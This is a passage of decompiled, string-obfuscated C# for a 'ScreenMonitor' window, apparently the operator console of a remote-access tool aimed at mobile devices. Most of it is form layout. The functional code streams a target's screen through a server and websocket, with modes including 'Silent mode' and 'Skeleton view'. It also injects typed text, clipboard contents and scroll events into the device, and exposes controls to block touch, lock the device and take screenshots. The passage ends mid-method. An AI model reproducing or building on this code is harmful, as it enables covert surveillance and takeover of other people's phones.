		this.Panel2.Controls.Add(this.stopbtn);
		this.Panel2.Controls.Add(this.DrakeWidth_W3);
		this.Panel2.Controls.Add(this.comboTargts);
		this.Panel2.Controls.Add(this.confbtn);
		this.Panel2.Controls.Add(this.DrakeWidth_W11);
		this.Panel2.Controls.Add(this.startbtn);
		this.Panel2.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel2.Location = new System.Drawing.Point(52, 62);
		this.Panel2.Name = EXGuarder._1E056E00;
		this.Panel2.Padding = new System.Windows.Forms.Padding(8);
		this.Panel2.Size = new System.Drawing.Size(385, 45);
		this.Panel2.TabIndex = 39;
		this.stopbtn.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.stopbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.stopbtn.Dock = System.Windows.Forms.DockStyle.Right;
		this.stopbtn.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.stopbtn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.stopbtn.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.stopbtn.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.stopbtn.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.stopbtn.Font = new System.Drawing.Font(EXGuarder._46447843, 9f);
		this.stopbtn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.stopbtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.stopbtn.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.stopbtn.Location = new System.Drawing.Point(288, 8);
		this.stopbtn.Name = EXGuarder._4176360C;
		this.stopbtn.Radius = 15;
		this.stopbtn.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.stopbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.stopbtn.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.stopbtn.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.stopbtn.RectSelectedColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.stopbtn.Size = new System.Drawing.Size(40, 29);
		this.stopbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.stopbtn.Symbol = 61516;
		this.stopbtn.SymbolSize = 18;
		this.stopbtn.TabIndex = 38;
		this.DrakeWidth_W3.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W3.Dock = System.Windows.Forms.DockStyle.Right;
		this.DrakeWidth_W3.Location = new System.Drawing.Point(328, 8);
		this.DrakeWidth_W3.Name = EXGuarder._4802351E;
		this.DrakeWidth_W3.Size = new System.Drawing.Size(9, 29);
		this.DrakeWidth_W3.TabIndex = 36;
		this.DrakeWidth_W11.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W11.Dock = System.Windows.Forms.DockStyle.Left;
		this.DrakeWidth_W11.Location = new System.Drawing.Point(8, 8);
		this.DrakeWidth_W11.Name = EXGuarder._18705029;
		this.DrakeWidth_W11.Size = new System.Drawing.Size(9, 29);
		this.DrakeWidth_W11.TabIndex = 35;
		this.startbtn.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.startbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.startbtn.Dock = System.Windows.Forms.DockStyle.Right;
		this.startbtn.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.startbtn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.startbtn.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.startbtn.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.startbtn.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.startbtn.Font = new System.Drawing.Font(EXGuarder._46447843, 9f);
		this.startbtn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.startbtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.startbtn.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.startbtn.Location = new System.Drawing.Point(337, 8);
		this.startbtn.Name = EXGuarder._6B356F20;
		this.startbtn.Radius = 15;
		this.startbtn.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.startbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.startbtn.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.startbtn.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.startbtn.RectSelectedColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.startbtn.Size = new System.Drawing.Size(40, 29);
		this.startbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.startbtn.Symbol = 61515;
		this.startbtn.SymbolSize = 18;
		this.startbtn.TabIndex = 37;
		this.statetimer.Interval = 1000;
		this.TableLayoutPanel1.ColumnCount = 3;
		this.TableLayoutPanel1.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Percent, 33.33333f));
		this.TableLayoutPanel1.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Percent, 33.33333f));
		this.TableLayoutPanel1.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Percent, 33.33333f));
		this.TableLayoutPanel1.Controls.Add(this.DrakeUIButtonIcon11, 0, 0);
		this.TableLayoutPanel1.Controls.Add(this.DrakeUIButtonIcon10, 0, 0);
		this.TableLayoutPanel1.Controls.Add(this.DrakeUIButtonIcon9, 0, 0);
		this.TableLayoutPanel1.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.TableLayoutPanel1.Location = new System.Drawing.Point(52, 753);
		this.TableLayoutPanel1.Name = EXGuarder._04055C4D;
		this.TableLayoutPanel1.RowCount = 1;
		this.TableLayoutPanel1.RowStyles.Add(new System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Percent, 100f));
		this.TableLayoutPanel1.Size = new System.Drawing.Size(385, 20);
		this.TableLayoutPanel1.TabIndex = 48;
		this.DrakeUIButtonIcon11.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon11.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon11.Dock = System.Windows.Forms.DockStyle.Fill;
		this.DrakeUIButtonIcon11.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon11.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon11.FillHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon11.FillPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon11.FillSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon11.Font = new System.Drawing.Font(EXGuarder._46447843, 9f);
		this.DrakeUIButtonIcon11.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.DrakeUIButtonIcon11.ForeHoverColor = System.Drawing.Color.Gray;
		this.DrakeUIButtonIcon11.Location = new System.Drawing.Point(259, 3);
		this.DrakeUIButtonIcon11.Name = EXGuarder._59221569;
		this.DrakeUIButtonIcon11.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.DrakeUIButtonIcon11.RectColor = System.Drawing.Color.Gray;
		this.DrakeUIButtonIcon11.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon11.RectHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon11.RectPressColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.DrakeUIButtonIcon11.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.DrakeUIButtonIcon11.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.DrakeUIButtonIcon11.Size = new System.Drawing.Size(123, 14);
		this.DrakeUIButtonIcon11.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon11.Symbol = 61537;
		this.DrakeUIButtonIcon11.SymbolSize = 20;
		this.DrakeUIButtonIcon11.TabIndex = 23;
		this.DrakeUIButtonIcon10.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon10.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon10.Dock = System.Windows.Forms.DockStyle.Fill;
		this.DrakeUIButtonIcon10.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon10.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon10.FillHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon10.FillPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon10.FillSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon10.Font = new System.Drawing.Font(EXGuarder._46447843, 9f);
		this.DrakeUIButtonIcon10.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.DrakeUIButtonIcon10.ForeHoverColor = System.Drawing.Color.Gray;
		this.DrakeUIButtonIcon10.Location = new System.Drawing.Point(131, 3);
		this.DrakeUIButtonIcon10.Name = EXGuarder._4E6B7956;
		this.DrakeUIButtonIcon10.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.DrakeUIButtonIcon10.RectColor = System.Drawing.Color.Gray;
		this.DrakeUIButtonIcon10.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon10.RectHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon10.RectPressColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.DrakeUIButtonIcon10.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.DrakeUIButtonIcon10.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.DrakeUIButtonIcon10.Size = new System.Drawing.Size(122, 14);
		this.DrakeUIButtonIcon10.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon10.Symbol = 57460;
		this.DrakeUIButtonIcon10.SymbolSize = 20;
		this.DrakeUIButtonIcon10.TabIndex = 22;
		this.DrakeUIButtonIcon9.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon9.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon9.Dock = System.Windows.Forms.DockStyle.Fill;
		this.DrakeUIButtonIcon9.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon9.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon9.FillHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon9.FillPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon9.FillSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon9.Font = new System.Drawing.Font(EXGuarder._46447843, 9f);
		this.DrakeUIButtonIcon9.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.DrakeUIButtonIcon9.ForeHoverColor = System.Drawing.Color.Gray;
		this.DrakeUIButtonIcon9.Location = new System.Drawing.Point(3, 3);
		this.DrakeUIButtonIcon9.Name = EXGuarder._39106078;
		this.DrakeUIButtonIcon9.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.DrakeUIButtonIcon9.RectColor = System.Drawing.Color.Gray;
		this.DrakeUIButtonIcon9.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon9.RectHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon9.RectPressColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.DrakeUIButtonIcon9.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.DrakeUIButtonIcon9.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.DrakeUIButtonIcon9.Size = new System.Drawing.Size(122, 14);
		this.DrakeUIButtonIcon9.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon9.Symbol = 61641;
		this.DrakeUIButtonIcon9.SymbolSize = 20;
		this.DrakeUIButtonIcon9.TabIndex = 21;
		this.inputtext.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.inputtext.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.inputtext.Enabled = false;
		this.inputtext.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.inputtext.FillDisableColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.inputtext.Font = new System.Drawing.Font(EXGuarder._46447843, 7f);
		this.inputtext.ForeColor = System.Drawing.Color.White;
		this.inputtext.Location = new System.Drawing.Point(52, 773);
		this.inputtext.Margin = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.inputtext.Maximum = 2147483647.0;
		this.inputtext.Minimum = -2147483648.0;
		this.inputtext.Name = EXGuarder._0368102A;
		this.inputtext.Padding = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.inputtext.Radius = 15;
		this.inputtext.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.inputtext.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.inputtext.Size = new System.Drawing.Size(385, 21);
		this.inputtext.Style = DrakeUI.Framework.UIStyle.Custom;
		this.inputtext.TabIndex = 66;
		this.inputtext.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.inputtext.Visible = false;
		this.inputtext.Watermark = EXGuarder._61425A29;
		this.BTtiptool.BackColor = System.Drawing.Color.FromArgb(54, 54, 54);
		this.BTtiptool.Font = new System.Drawing.Font(EXGuarder._46447843, 9f);
		this.BTtiptool.ForeColor = System.Drawing.Color.FromArgb(239, 239, 239);
		this.BTtiptool.OwnerDraw = true;
		this.BTtiptool.RectColor = System.Drawing.Color.Gray;
		this.BTtiptool.ShowAlways = true;
		this.BTtiptool.TitleFont = new System.Drawing.Font(EXGuarder._46447843, 9f);
		this.BTtiptool.ToolTipIcon = System.Windows.Forms.ToolTipIcon.Info;
		this.BTtiptool.ToolTipTitle = EXGuarder._0F385A4A;
		this.savertimer.Interval = 1000;
		this.slideTimer.Interval = 15;
		base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 18f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		base.ClientSize = new System.Drawing.Size(439, 796);
		base.Controls.Add(this.viewimage);
		base.Controls.Add(this.TableLayoutPanel1);
		base.Controls.Add(this.inputtext);
		base.Controls.Add(this.Panel2);
		base.Controls.Add(this.confpanel);
		base.Icon = (System.Drawing.Icon)resources.GetObject(EXGuarder._474C6A56);
		this.MinimumSize = new System.Drawing.Size(439, 0);
		base.Name = EXGuarder._4617562F;
		base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
		this.Text = EXGuarder._0D33113A;
		base.Controls.SetChildIndex(this.tobpanelsti, 0);
		base.Controls.SetChildIndex(this.confpanel, 0);
		base.Controls.SetChildIndex(this.Panel2, 0);
		base.Controls.SetChildIndex(this.inputtext, 0);
		base.Controls.SetChildIndex(this.TableLayoutPanel1, 0);
		base.Controls.SetChildIndex(this.viewimage, 0);
		((System.ComponentModel.ISupportInitialize)this.myscr).EndInit();
		((System.ComponentModel.ISupportInitialize)this.myico).EndInit();
		this.tobpanelsti.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.viewimage).EndInit();
		this.confpanel.ResumeLayout(false);
		this.Panel15.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.smallviewimage).EndInit();
		this.Panel11.ResumeLayout(false);
		this.Panel10.ResumeLayout(false);
		this.Panel8.ResumeLayout(false);
		this.Panel7.ResumeLayout(false);
		this.Panel2.ResumeLayout(false);
		this.TableLayoutPanel1.ResumeLayout(false);
		base.ResumeLayout(false);
	}

	private void translateme()
	{
		BTtiptool.SetToolTip(autorotbtn, BTConst.autorotatstr);
		BTtiptool.SetToolTip(blocktoch, EXGuarder._5E156A43);
		object value = BTRegistry.GetValue(EXGuarder._20081B44, EXGuarder._5C33401E);
		if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._6368434F, TextCompare: false))
		{
			comboTargts.Text = EXGuarder._61456131;
			BTtiptool.SetToolTip(confbtn, EXGuarder._3E632264);
			BTtiptool.SetToolTip(ctrlbtn, EXGuarder._0F335129);
			BTtiptool.SetToolTip(blockbtn, EXGuarder._2D066A0C);
			BTtiptool.SetToolTip(skltonbtn, EXGuarder._3223770C);
			BTtiptool.SetToolTip(lokbtn, EXGuarder._0D75134B);
			BTtiptool.SetToolTip(unlockbtn, EXGuarder._0D75134B);
			BTtiptool.SetToolTip(keybordon, EXGuarder._544D1002);
			BTtiptool.SetToolTip(keybordoff, EXGuarder._544D1002);
			BTtiptool.SetToolTip(soundown, EXGuarder._56604972);
			BTtiptool.SetToolTip(sondup, EXGuarder._56604972);
			BTtiptool.SetToolTip(mscrtshots, EXGuarder._61125549);
			BTtiptool.SetToolTip(scrshot, EXGuarder._61125549);
			inputtext.Text = EXGuarder._614F4501;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._392F066F, TextCompare: false))
		{
			comboTargts.Text = EXGuarder._36041502;
			BTtiptool.SetToolTip(confbtn, EXGuarder._2E492E13);
			BTtiptool.SetToolTip(ctrlbtn, EXGuarder._68540244);
			BTtiptool.SetToolTip(blockbtn, EXGuarder._6863146C);
			BTtiptool.SetToolTip(skltonbtn, EXGuarder._52734D1F);
			BTtiptool.SetToolTip(lokbtn, EXGuarder._1567070B);
			BTtiptool.SetToolTip(unlockbtn, EXGuarder._1567070B);
			BTtiptool.SetToolTip(keybordon, EXGuarder._0F590B4F);
			BTtiptool.SetToolTip(keybordoff, EXGuarder._0F590B4F);
			BTtiptool.SetToolTip(soundown, EXGuarder._78521F24);
			BTtiptool.SetToolTip(sondup, EXGuarder._78521F24);
			BTtiptool.SetToolTip(mscrtshots, EXGuarder._2640366F);
			BTtiptool.SetToolTip(scrshot, EXGuarder._2640366F);
			inputtext.Text = EXGuarder._52645809;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._41197406, TextCompare: false))
		{
			comboTargts.Text = EXGuarder._4D542372;
			BTtiptool.SetToolTip(confbtn, EXGuarder._51272E01);
			BTtiptool.SetToolTip(ctrlbtn, EXGuarder._6D2B4631);
			BTtiptool.SetToolTip(blockbtn, EXGuarder._4A4B183F);
			BTtiptool.SetToolTip(skltonbtn, EXGuarder._15471714);
			BTtiptool.SetToolTip(lokbtn, EXGuarder._69325B12);
			BTtiptool.SetToolTip(unlockbtn, EXGuarder._69325B12);
			BTtiptool.SetToolTip(keybordon, EXGuarder._586E585C);
			BTtiptool.SetToolTip(keybordoff, EXGuarder._586E585C);
			BTtiptool.SetToolTip(soundown, EXGuarder._3835613E);
			BTtiptool.SetToolTip(sondup, EXGuarder._3835613E);
			BTtiptool.SetToolTip(mscrtshots, EXGuarder._225F3917);
			BTtiptool.SetToolTip(scrshot, EXGuarder._225F3917);
			inputtext.Text = EXGuarder._411A283B;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._654D1C19, TextCompare: false))
		{
			comboTargts.Text = EXGuarder._74182677;
			BTtiptool.SetToolTip(confbtn, EXGuarder._69190D4B);
			BTtiptool.SetToolTip(ctrlbtn, EXGuarder._686F4C69);
			BTtiptool.SetToolTip(blockbtn, EXGuarder._3D4F6B4A);
			BTtiptool.SetToolTip(skltonbtn, EXGuarder._6D727453);
			BTtiptool.SetToolTip(lokbtn, EXGuarder._6F43325B);
			BTtiptool.SetToolTip(unlockbtn, EXGuarder._6F43325B);
			BTtiptool.SetToolTip(keybordon, EXGuarder._41026717);
			BTtiptool.SetToolTip(keybordoff, EXGuarder._41026717);
			BTtiptool.SetToolTip(soundown, EXGuarder._635F1176);
			BTtiptool.SetToolTip(sondup, EXGuarder._635F1176);
			BTtiptool.SetToolTip(mscrtshots, EXGuarder._5D0D6545);
			BTtiptool.SetToolTip(scrshot, EXGuarder._5D0D6545);
			inputtext.Text = EXGuarder._51454974;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._0A152743, TextCompare: false))
		{
			comboTargts.Text = EXGuarder._3B170240;
			BTtiptool.SetToolTip(confbtn, EXGuarder._57062605);
			BTtiptool.SetToolTip(ctrlbtn, EXGuarder._7274054D);
			BTtiptool.SetToolTip(blockbtn, EXGuarder._3A1C1B0A);
			BTtiptool.SetToolTip(skltonbtn, EXGuarder._6630633F);
			BTtiptool.SetToolTip(lokbtn, EXGuarder._46126306);
			BTtiptool.SetToolTip(unlockbtn, EXGuarder._46126306);
			BTtiptool.SetToolTip(keybordon, EXGuarder._795D4E1E);
			BTtiptool.SetToolTip(keybordoff, EXGuarder._795D4E1E);
			BTtiptool.SetToolTip(soundown, EXGuarder._550F3024);
			BTtiptool.SetToolTip(sondup, EXGuarder._550F3024);
			BTtiptool.SetToolTip(mscrtshots, EXGuarder._5B5B682C);
			BTtiptool.SetToolTip(scrshot, EXGuarder._5B5B682C);
			inputtext.Text = EXGuarder._4C13750E;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._086A241D, TextCompare: false))
		{
			comboTargts.Text = EXGuarder._3A28666B;
			BTtiptool.SetToolTip(confbtn, EXGuarder._56565034);
			BTtiptool.SetToolTip(ctrlbtn, EXGuarder._2B254715);
			BTtiptool.SetToolTip(blockbtn, EXGuarder._1B5F114A);
			BTtiptool.SetToolTip(skltonbtn, EXGuarder._113A0E38);
			BTtiptool.SetToolTip(lokbtn, EXGuarder._09324444);
			BTtiptool.SetToolTip(unlockbtn, EXGuarder._09324444);
			BTtiptool.SetToolTip(keybordon, EXGuarder._795D4E1E);
			BTtiptool.SetToolTip(keybordoff, EXGuarder._795D4E1E);
			BTtiptool.SetToolTip(soundown, EXGuarder._58666F59);
			BTtiptool.SetToolTip(sondup, EXGuarder._58666F59);
			BTtiptool.SetToolTip(mscrtshots, EXGuarder._37120E59);
			BTtiptool.SetToolTip(scrshot, EXGuarder._37120E59);
			inputtext.Text = EXGuarder._0373552E;
		}
	}

	public ScreenMonitor()
	{
		base.Load += ScreenMonitor_Load;
		base.FormClosing += ScreenMonitor_FormClosing;
		FPS = 0;
		websockclient = null;
		LiveisBigger = true;
		CurrentState = EXGuarder._2037362F;
		screenSize = default(Size);
		screenorinta = EXGuarder._2037362F;
		Lastrotate = EXGuarder._1D263E05;
		isDown = false;
		isClick = false;
		trackPoints = new List<Point>();
		dragThreshold = 5;
		slideStep = 10;
		panelExpanded = false;
		InitializeComponent();
	}

	private void Toggleleftpanel_Click(object sender, EventArgs e)
	{
		checked
		{
			if (!confpanel.Visible)
			{
				confpanel.Visible = true;
				base.Width += 100;
			}
			else
			{
				confpanel.Visible = false;
				base.Width -= 100;
			}
		}
	}

	private void ScreenMonitor_Load(object sender, EventArgs e)
	{
		object value = BTRegistry.GetValue(EXGuarder._31405011, EXGuarder._4D6F1013);
		if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._570D336F, TextCompare: false))
		{
			inputtext.Enabled = true;
			inputtext.Visible = true;
			base.KeyPreview = false;
			inputtext.TabStop = true;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._4D6F1013, TextCompare: false))
		{
			inputtext.Enabled = false;
			inputtext.Visible = false;
			base.KeyPreview = true;
			base.ActiveControl = null;
			foreach (Control control in base.Controls)
			{
				control.TabStop = false;
			}
			base.KeyPress += Form1_KeyPress;
			base.KeyDown += Form1_KeyDown;
			base.MouseWheel += Form1_MouseWheel;
		}
		base.Opacity = 0.0;
		checked
		{
			int num = (int)Math.Round((double)Screen.FromControl(this).WorkingArea.Height * 0.9);
			int num2 = (int)Math.Round((double)num * 9.0 / 16.0);
			Size size = new Size(num2, num);
			base.Size = size;
			myico.Image = Btcli.wallpaper;
			translateme();
			statetimer.Start();
			base.Opacity = 1.0;
		}
	}

	private void Form1_KeyPress(object sender, KeyPressEventArgs e)
	{
		if (!char.IsControl(e.KeyChar))
		{
			SendTypedChar(e.KeyChar.ToString());
			e.Handled = true;
		}
	}

	private void Form1_KeyDown(object sender, KeyEventArgs e)
	{
		if (e.Control && e.KeyCode == Keys.V)
		{
			string ch = System.Windows.Forms.Clipboard.GetText();
			SendTypedChar(ch);
			e.SuppressKeyPress = true;
			e.Handled = true;
			return;
		}
		switch (e.KeyCode)
		{
		case Keys.Space:
			SendTypedChar(EXGuarder._05053203);
			e.SuppressKeyPress = true;
			e.Handled = true;
			break;
		case Keys.Tab:
			e.SuppressKeyPress = true;
			e.Handled = true;
			break;
		case Keys.Back:
			SendBackspace();
			e.SuppressKeyPress = true;
			e.Handled = true;
			break;
		case Keys.Escape:
			pressback();
			e.SuppressKeyPress = true;
			e.Handled = true;
			break;
		}
	}

	private void Form1_MouseWheel(object sender, MouseEventArgs e)
	{
		if (e.Delta > 0)
		{
			SendWheel(EXGuarder._6027636B);
		}
		else if (e.Delta < 0)
		{
			SendWheel(EXGuarder._413C112D);
		}
	}

	private void SendTypedChar(string ch)
	{
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._7212526F, EXGuarder._29031244);
		dictionary.Add(EXGuarder._1E78674E, EXGuarder._5005681B);
		dictionary.Add(EXGuarder._745E0A02, ch);
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
	}

	private void SendBackspace()
	{
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._1628433C, EXGuarder._4A5D401D);
		dictionary.Add(EXGuarder._232B6119, EXGuarder._491F1079);
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
	}

	private void SendWheel(string direction)
	{
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._476F0C23, EXGuarder._40000D25);
		dictionary.Add(EXGuarder._3F472C42, EXGuarder._5B415B6A);
		dictionary.Add(EXGuarder._481D383E, direction);
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
	}

	private async void entrbtn_Click(object sender, EventArgs e)
	{
		if (!startbtn.Enabled)
		{
			return;
		}
		string scrt;
		switch (comboTargts.Text)
		{
		case "Live screen":
			scrt = "N";
			break;
		case "Silent mode":
			scrt = "SM";
			break;
		case "Skeleton view":
			scrt = "SK";
			break;
		case "In App":
			scrt = "IN";
			break;
		default:
			BTAlerter.infos("Select screen type.");
			return;
		}
		startbtn.Enabled = false;
		stopbtn.Enabled = false;
		baseloader.Enabled = true;
		baseloader.Visible = true;
		CurrentState = BTConst.selectedtypstr + ": " + comboTargts.Text + Strings.Space(10) + BTConst.Connectingstr;
		try
		{
			string serverNextKey = ServersMgr.GetServerNextKey(Btcli.Serverins.Address);
			string json = await MyServer.JoinServer(new VB_0024AnonymousType_3<string, string, string, string>("join", "0", "0", serverNextKey), Btcli.Serverins.MainhttpClient, Btcli.Serverins.Address);
			JObject jObject;
			try
			{
				jObject = JObject.Parse(json);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				BTAlerter.infos("Invalid server response.");
				startbtn.Enabled = true;
				ProjectData.ClearProjectError();
				return;
			}
			if (jObject["Success"] == null)
			{
				BTAlerter.infos("Server rejected connection.");
				startbtn.Enabled = true;
				return;
			}
			string text = jObject["Success"].ToString().Trim('"');
			Debuger.Log_d("Cli IDF websock", text);
			websockclient = new WebSocketClient(BTConst.livscrstr, Btcli.address, Btcli.Serverins);
			try
			{
				await websockclient.ConnectAsync(text);
			}
			catch (TimeoutException projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				BTAlerter.infos("Connection timeout.");
				startbtn.Enabled = true;
				ProjectData.ClearProjectError();
				return;
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				Exception ex3 = ex2;
				BTAlerter.infos("Connection failed: " + ex3.Message);
				startbtn.Enabled = true;
				ProjectData.ClearProjectError();
				return;
			}
			Debuger.Log_d("IDF Ready to use", text);
			string scrre = Conversions.ToString(RuntimeHelpers.GetObjectValue(BTRegistry.GetValue("screenquality", "320")));
			VB_0024AnonymousType_30<string, string, string, string, string> data = new VB_0024AnonymousType_30<string, string, string, string, string>("ON", scrt, text, "10", scrre);
			string value = BTCommand.FormatCommand("Screen", data);
			Dictionary<string, object> chatData = new Dictionary<string, object>
			{
				{
					"msg",
					BTConst.wrk
				},
				{ "cmnd", value }
			};
			BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
			stopbtn.Enabled = true;
			myscr.Visible = true;
			sendquality();
		}
		catch (Exception ex4)
		{
			ProjectData.SetProjectError(ex4);
			Exception ex5 = ex4;
			Exception ex6 = ex5;
			Debuger.Log_d("entrbtn_Click error", ex6.Message);
			BTAlerter.infos("Unexpected error occurred.");
			startbtn.Enabled = true;
			ProjectData.ClearProjectError();
		}
	}

	private void stopbtn_Click(object sender, EventArgs e)
	{
		if (stopbtn.Enabled)
		{
			VB_0024AnonymousType_5<string> data = new VB_0024AnonymousType_5<string>(EXGuarder._34251823);
			string value = BTCommand.FormatCommand(EXGuarder._4459364F, data);
